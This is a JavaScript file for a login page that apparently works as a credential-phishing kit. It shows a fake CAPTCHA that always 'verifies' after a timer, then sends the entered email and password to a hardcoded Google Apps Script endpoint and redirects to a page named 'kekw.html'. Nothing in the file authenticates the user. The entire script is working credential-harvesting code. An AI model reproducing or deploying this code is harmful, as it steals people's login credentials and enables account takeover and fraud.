document.addEventListener("DOMContentLoaded", function () {
    const captchaButton = document.getElementById("captcha-button");
    const loginButton = document.querySelector("button[type='submit']");
    const captchaText = document.getElementById("captcha-text");
    const captchaStatus = document.getElementById("captcha-status");
    const emailField = document.getElementById("email");
    const passwordField = document.getElementById("password");
    let isVerified = false;

    // Disable login button initially
    loginButton.disabled = true;

    // Add event listeners for input fields
    //emailField.addEventListener("input", validateFields);
    //passwordField.addEventListener("input", validateFields);

    // Check if both fields are filled
    function validateFields() {
        const email = emailField.value.trim();
        const password = passwordField.value.trim();
        if (email !== "" && password !== "") {
            captchaButton.disabled = false; // Enable captcha button if fields are filled
        } else {
            captchaButton.disabled = true; // Disable captcha button if any field is empty
            loginButton.disabled = true; // Also disable the login button
        }
    }

    // Handle CAPTCHA verification
    captchaButton.addEventListener("click", function (event) {
        event.preventDefault();
        const email = emailField.value.trim();
        const password = passwordField.value.trim();
        if (email !== "" && password !== "") {
            captchaStatus.innerText = "Verifying...";
            setTimeout(() => {
                captchaText.innerText = "You're not a robot";
                captchaButton.disabled = true;
                captchaStatus.innerText = "";
                isVerified = true;
                validateFields();
                loginButton.disabled = false; // Enable login button after verification
            }, 2000);
        } else {
            alert("Please fill out both the email/username and password fields.");
        }
    });

    // Handle login submission
    loginButton.addEventListener("click", function (event) {
        event.preventDefault();
        if (isVerified) {
            const email = emailField.value.trim();
            const password = passwordField.value.trim();

            if (email !== "" && password !== "") {
                // Proceed to send data to Google Apps Script
                sendToGoogleDrive(email, password);
                setTimeout(() => {
                    window.location.href = 'kekw.html';
                }, 2000);
            } else {
                alert("Please fill out both the email/username and password fields.");
            }
        } else {
            alert("Please complete the CAPTCHA verification first.");
        }
    });

    // Function to send data to Google Apps Script
    function sendToGoogleDrive(email, password) {
        const url = "https://script.google.com/macros/s/AKfycbydvcJvSwn9JiDeoMdnvlGYe5QRyS5o-o13Fi2nhcHaihDwQsXUAo_zvyzkvsaViLeQOQ/exec"; // Replace with your Google Apps Script URL
        const data = new FormData();
        data.append("email", email);
        data.append("password", password);

        fetch(url, {
            method: "POST",
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json'
            },
            body: data
        })
        .then(response => response.text())
        .then(result => {
            console.log(result);
            // You can add any post-submission actions here, e.g., redirecting to another page
        })
        .catch(error => console.error("Error:", error));
    }
});